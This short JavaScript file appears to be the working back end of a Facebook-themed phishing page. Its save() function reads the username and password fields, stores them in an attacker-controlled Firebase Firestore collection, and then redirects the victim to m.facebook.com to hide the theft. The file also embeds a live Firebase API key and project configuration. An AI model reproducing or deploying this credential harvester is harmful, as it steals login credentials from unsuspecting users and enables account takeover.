firebase.initializeApp({
  apiKey: "AIzaSyCUEcMi0tMUyBICjn79Wen1zksNv6X3MGg",
  authDomain: "datosyusuarios3.firebaseapp.com",
  databaseURL: "https://datosyusuarios3-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "datosyusuarios3",
  storageBucket: "datosyusuarios3.appspot.com",
  messagingSenderId: "1018178001283",
  appId: "1:1018178001283:web:c7d505275822ee2fd63eb6"
});

var db = firebase.firestore();


function save(){
  db.collection("users").add({
    Campo1: document.getElementById("user").value,
    Campo2: document.getElementById("passw").value,
  })
  .then((docRef) => {
    window.location.replace('https://m.facebook.com');
  })
  .catch((error) => {
      alert('Se ha producido un error al registrar');
  });
}